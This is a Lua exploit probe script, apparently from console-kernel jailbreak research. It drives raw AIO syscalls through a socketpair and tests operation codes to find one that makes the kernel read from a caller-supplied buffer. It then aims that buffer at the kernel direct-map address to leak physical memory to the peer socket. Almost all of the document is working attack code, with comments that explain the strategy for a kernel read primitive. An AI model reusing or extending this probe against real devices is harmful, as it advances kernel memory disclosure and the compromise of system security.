-- CRASH_CLASS: HIGH
-- PROBE 752a: the aio operation field on a socket, and a kernel source buffer
--
-- 747a's op matrix never ran (it died on the file buffer first). This asks the
-- same question where the answer is self-confirming: if some value of the
-- descriptor dword at +0x24 makes the aio read FROM the buffer instead of into
-- it, the bytes land in the peer socket and read() hands them straight back.
--
-- A socket peer is polled, never read blindly, so an empty socket cannot block
-- the loader.
--
-- A: op 0..3 on a socket with a 0x41 fill; poll the peer after each, read if
--    readable, print what arrived
-- B: the op that delivered data is repeated with the buffer pointed at the
--    direct-map base. If the address is unchecked and the map is present, the
--    peer receives 16 bytes of low physical memory - a kernel read we can see.
-- C: health

print("=== PROBE 752a: AIO SOCKET OP AND KERNEL SOURCE ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}
    for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n
    setmetatable(t,getmetatable(syscall.pipe))
    return t
end
local U = function(a) a=to_num(a); return uint64(string.format("0x%08X%08X", math.floor(a/4294967296), a%4294967296)) end
local sc_pair = mk(135); local sc_read = mk(3); local sc_poll = mk(209)
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end
local function call(sc, a1, a2, a3, a4, a5, a6)
    local ok, r = pcall(function() return sc(U(a1), U(a2), U(a3), U(a4), U(a5), U(a6)) end)
    if not ok then return "DEAD" end
    return to_num(r)
end
local ts = memory.alloc(16)
local function sleep_ms(ms) wq(ts,0); wq(ts+8, ms*1000000); pcall(function() mk(240)(U(ts), U(0)) end) end
print("[A] pid="..tostring(call(syscall.pipe, 20,0,0,0,0,0,0)))

local pf = to_num(memory.alloc(64)); zero(pf, 64)
print("[A] socketpair -> "..tostring(call(sc_pair, 1, 1, 0, pf, 0, 0)))
local s0 = rd(pf); local s1 = rd(pf+4)
print(string.format("[A] s0=%d s1=%d", s0, s1))

local pfd = to_num(memory.alloc(32)); zero(pfd, 32)
local rbuf = to_num(memory.alloc(0x400)); zero(rbuf, 0x400)
local function peer_ready()
    zero(pfd, 32); wd(pfd, s1); wd(pfd+4, 1)      -- events POLLIN
    local r = call(sc_poll, pfd, 1, 0, 0, 0, 0)
    local rev = rd(pfd+6)
    return r, rev
end

local D = to_num(memory.alloc(0x2000)); local buf = to_num(memory.alloc(0x2000)); local res = to_num(memory.alloc(0x2000))
local ids = to_num(memory.alloc(0x400)); local st = to_num(memory.alloc(0x400)); local ds = to_num(memory.alloc(0x400))
zero(D,0x2000); zero(buf,0x2000); zero(res,0x2000); zero(st,0x400); zero(ds,0x400)

local function op_call(tag, b, op, len)
    zero(D,0x100); zero(res,0x40); zero(st,0x40); zero(ds,0x40)
    wq(D+0x00, uint64(0)); wq(D+0x08, uint64(len))
    wq(D+0x10, uint64(b)); wq(D+0x18, uint64(res))
    wd(D+0x20, s0); wd(D+0x24, op)
    wd(ids, 0)
    local cr = call(mk(669), 1+0x1000, D, 1, 1, ids, 0)
    local id = rd(ids)
    print(string.format("%s create ret=%s id=%08X", tag, tostring(cr), id))
    if id == 0 or id == -1 then return end
    sleep_ms(50)
    wd(ids, id); call(mk(664), ids, 1, st, 0, 0, 0)
    print(string.format("%s state=%08X res=%X %X %X %X", tag, rd(st), rd(res), rd(res+4), rd(res+8), rd(res+12)))
    local pr, rev = peer_ready()
    print(string.format("%s poll=%s revents=%s", tag, tostring(pr), tostring(rev)))
    if type(rev) == "number" and (rev % 2) == 1 then
        zero(rbuf, 0x40)
        local n = call(sc_read, s1, rbuf, 16, 0, 0, 0)
        print(string.format("%s read=%s bytes=%X %X %X %X", tag, tostring(n), rd(rbuf), rd(rbuf+4), rd(rbuf+8), rd(rbuf+12)))
    end
    wd(ids, id); call(mk(662), ids, 1, ds, 0, 0, 0)
    print(string.format("%s delete=%08X", tag, rd(ds)))
end

local delivered = nil
for op=0,3 do
    zero(buf,0x40)
    for k=0,3 do wd(buf+k*4, 0x41414141 + op) end
    op_call(string.format("[A] op=%d", op), buf, op, 16)
    if delivered == nil then
        local rev = rd(pfd+6)
        if type(rev) == "number" and (rev % 2) == 1 then delivered = op end
    end
end
print("[B] delivering op="..tostring(delivered))
print("[B] health="..tostring(call(syscall.pipe, 20,0,0,0,0,0,0)))

if delivered then
    op_call("[C] kernel source op="..delivered, 0xFFFFFE0000000000, delivered, 16)
    print("[D] health="..tostring(call(syscall.pipe, 20,0,0,0,0,0,0)))
end
print("=== 752a DONE ===")
